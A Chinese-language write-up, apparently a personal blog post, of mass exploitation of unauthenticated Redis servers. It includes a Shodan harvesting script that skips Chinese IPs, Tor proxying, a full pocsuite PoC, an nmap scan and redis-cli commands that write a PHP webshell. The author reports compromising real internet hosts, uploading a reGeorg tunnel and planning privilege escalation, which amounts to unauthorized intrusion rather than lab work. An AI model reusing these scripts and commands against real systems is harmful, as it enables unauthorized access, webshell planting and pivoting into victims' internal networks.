# 对redis未授权访问漏洞利用测试

## 代理

配置proxychains使用tor网络，开启ss-server进程：

> proxychains ss-server -c tor_config.json -f pid 2

## 通过shodan提供的API:

> 账户权限不够，只能获取前100条数据进行测试。

```python
api = shodan.Shodan('apikey')
try:
    res = api.search("redis")
	print(res['total'])
	with open("./test_ip.txt","w") as fo:
		for res in res['matches']:
			if res['location']['country_code'] == 'CN':
				continue
			fo.write(res['ip_str']+"\n")
except shodan.APIError as e:
	print(e)
```

## 测试是否存在redis未授权

> pocsuite -f redis_ip.txt -r redis_poc.py -proxy 127.0.0.1:1080 

### 利用POC:

```python
#!/usr/bin/env python
# -*- coding:utf-8 -*-

import socket
import urlparse
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register


class TestPOC(POCBase):
    vulID = '89339'
    version = '1'
    author = ['Anonymous']
    vulDate = '2015-10-26'
    createDate = '2015-10-26'
    updateDate = '2015-10-26'
    references = ['http://sebug.net/vuldb/ssvid-89339']
    name = 'Redis 未授权访问 PoC'
    appPowerLink = 'http://redis.io/'
    appName = 'Redis'
    appVersion = 'All'
    vulType = 'Unauthorized access'
    desc = '''
        redis 默认不需要密码即可访问，黑客直接访问即可获取数据库中所有信息，造成严重的信息泄露。
    '''
    samples = ['']

    def _verify(self):
        result = {}
        payload = '\x2a\x31\x0d\x0a\x24\x34\x0d\x0a\x69\x6e\x66\x6f\x0d\x0a'
        s = socket.socket()
        socket.setdefaulttimeout(10)
        try:
            host = urlparse.urlparse(self.url).netloc
            port = 6379
            s.connect((host, port))
            s.send(payload)
            recvdata = s.recv(1024)
            if recvdata and 'redis_version' in recvdata:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['Port'] = port
        except:
            pass
        s.close()
        return self.parse_attack(result)

    def _attack(self):
        return self._verify()

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
```

结果：
> success : 40 / 54 

### 测试是否有root权限能否写入公钥，测试ssh连接

 利用exp: https://github.com/Xyntax/POC-T/blob/master/script/redis-sshkey-getshell.py
 > 结果 1/40

## 探测是否开放80端口

> nmap -Pn -sS -p80,443,8080, -iL redis_success_ip.txt -oX ./redis_http_ip.xml

### 使用脚本枚举绝对路径

exp：https://github.com/Xyntax/POC-T/blob/master/script/redis-web-probe.py

![path](https://nanazeven.github.io/image/path.png)

### 批量识别指纹

> whatweb --no-error -i redis_http.txt --log-brief=res_out

### 手动连接测试

```code
proxychians redis-cli -h ip:6379
config set dir /var/www/html 
config set dbfilename 2.php
set x "<?php phpinfo();?>"
save
```

### 成功写入webshell：

![res1](https://nanazeven.github.io/image/res1.png)

### 连接菜刀&上传端口转发脚本&查看权限

使用SocksCap64启动caodao.exe

> 端口转发脚本：https://github.com/sensepost/reGeorg

```bash
$ whoami
$ www-data
$ ifconfig
```

执行ifconfig发现存在和其他网络的联通。需要提权。

## 另一个目标：使用默认目录作为项目根目录

成功写入webshell，是用菜刀上传端口转发脚本。
www-data需要提权
![res2](https://nanazeven.github.io/image/res2.png)
